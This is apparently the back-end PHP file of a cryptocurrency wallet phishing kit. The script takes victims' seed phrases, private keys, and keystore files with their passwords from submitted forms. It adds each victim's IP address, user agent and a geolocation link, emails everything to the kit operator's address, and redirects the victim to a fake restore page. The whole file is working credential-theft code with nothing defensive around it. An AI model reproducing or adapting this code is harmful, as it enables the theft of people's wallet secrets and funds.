<?php
ob_start();
include 'email.php';

if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Private Key |--------------|\n";
	
	$message .= "wallet Type             : ".$_POST['wallet_type']."\n";
	$message .= "Phrase             : ".$_POST['phrase_val']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./restore.html?count=1");
	
}
else if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Mnemonic Phrase |--------------|\n";
	$message .= "wallet Type             : ".$_POST['wallet_type']."\n";

	$message .= "Keystore JSON             : ".$_POST['json_key']."\n";
	
	$message .= "Password           : ".$_POST['json_key_password']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./restore.html?count=1");
	
	
}
else if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Keystore File |--------------|\n";
	$message .= "wallet Type             : ".$_POST['wallet_type']."\n";

	$message .= "Private Key             : ".$_POST['private_key']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./restore.html?count=1");
	
	
}
ob_end_flush();
?>